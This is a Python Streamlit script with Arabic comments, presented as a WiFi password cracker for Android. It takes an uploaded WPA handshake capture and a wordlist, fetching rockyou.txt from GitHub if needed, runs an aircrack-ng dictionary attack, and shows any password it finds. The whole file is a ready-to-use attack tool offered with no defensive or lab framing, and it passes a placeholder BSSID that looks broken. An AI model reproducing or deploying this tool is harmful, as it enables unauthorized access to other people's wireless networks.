#!/usr/bin/env python3
# أداة اختراق WiFi باستخدام Streamlit - تعمل على أندرويد
# بدون حاجة لوضع المراقبة (يعمل على ملفات .cap)
# التشغيل: streamlit run wifi_cracker.py

import streamlit as st
import subprocess
import os
import tempfile
import time

# إعداد الصفحة
st.set_page_config(
    page_title="منارة نونو - WiFi Cracker",
    page_icon="🔓",
    layout="centered"
)

st.markdown("# 🔓 WiFi Password Cracker")
st.markdown("### هجوم القاموس على ملف المصافحة (Handshake)")
st.markdown("---")

# اختيار ملف المصافحة
uploaded_cap = st.file_uploader(
    "📁 ارفع ملف المصافحة (.cap أو .pcap)",
    type=["cap", "pcap"]
)

# اختيار قائمة الكلمات
wordlist_option = st.radio(
    "اختر قائمة الكلمات:",
    ["رفع ملف خاص", "استخدام القائمة المضمنة (rockyou.txt)"]
)

wordlist_file = None
if wordlist_option == "رفع ملف خاص":
    uploaded_wordlist = st.file_uploader(
        "📁 ارفع ملف قائمة الكلمات (txt)",
        type=["txt"]
    )
    if uploaded_wordlist is not None:
        # حفظ القائمة مؤقتاً
        with tempfile.NamedTemporaryFile(delete=False, suffix=".txt") as tmp:
            tmp.write(uploaded_wordlist.read())
            wordlist_file = tmp.name
else:
    # استخدام rockyou.txt الموجود في النظام (أو تنزيله)
    rockyou_path = "/usr/share/wordlists/rockyou.txt"
    if os.path.exists(rockyou_path):
        wordlist_file = rockyou_path
    else:
        st.warning("⚠️ rockyou.txt غير موجود في المسار الافتراضي. سيتم تنزيل نسخة مصغرة.")
        # تنزيل نسخة مصغرة من rockyou (أول 1000 كلمة)
        mini_rockyou = "mini_rockyou.txt"
        if not os.path.exists(mini_rockyou):
            # تحميل من GitHub
            import urllib.request
            url = "https://raw.githubusercontent.com/brannondorsey/naive-hashcat/master/rockyou.txt"
            try:
                urllib.request.urlretrieve(url, mini_rockyou)
            except:
                st.error("فشل تنزيل القائمة. يرجى رفع ملف خاص.")
        if os.path.exists(mini_rockyou):
            wordlist_file = mini_rockyou

# زر البدء
if st.button("🚀 بدء الهجوم", use_container_width=True):
    if uploaded_cap is None:
        st.error("❌ يرجى رفع ملف المصافحة أولاً.")
    elif wordlist_file is None:
        st.error("❌ يرجى اختيار قائمة كلمات صالحة.")
    else:
        # حفظ ملف المصافحة مؤقتاً
        with tempfile.NamedTemporaryFile(delete=False, suffix=".cap") as cap_tmp:
            cap_tmp.write(uploaded_cap.read())
            cap_path = cap_tmp.name

        st.info("⏳ جاري تنفيذ الهجوم... قد يستغرق بعض الوقت.")

        # تشغيل aircrack-ng
        cmd = [
            "aircrack-ng",
            "-w", wordlist_file,
            "-b", "XX:XX:XX:XX:XX:XX",  # BSSID اختياري (سيتم استخراجه تلقائياً)
            cap_path
        ]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300  # 5 دقائق كحد أقصى
            )
            output = result.stdout + result.stderr

            # عرض النتائج
            st.markdown("### 📊 نتائج الهجوم:")
            if "KEY FOUND" in output:
                # استخراج كلمة المرور
                for line in output.splitlines():
                    if "KEY FOUND" in line:
                        password = line.split(":")[-1].strip()
                        st.success(f"✅ تم العثور على كلمة المرور: `{password}`")
                        break
                st.code(output, language="bash")
            else:
                st.warning("❌ لم يتم العثور على كلمة المرور في القائمة.")
                st.code(output, language="bash")

        except subprocess.TimeoutExpired:
            st.error("⏰ انتهى الوقت المحدد (5 دقائق).")
        except FileNotFoundError:
            st.error("❌ أداة aircrack-ng غير مثبتة. قم بتثبيتها: `pkg install aircrack-ng`")
        except Exception as e:
            st.error(f"❌ حدث خطأ: {e}")

        # تنظيف الملفات المؤقتة
        os.unlink(cap_path)
        if wordlist_option == "رفع ملف خاص" and wordlist_file:
            os.unlink(wordlist_file)

st.markdown("---")
st.markdown("💡 **ملاحظة:** تأكد من تثبيت `aircrack-ng` على جهازك.")
st.markdown("made by @cheifbreef on discord :)")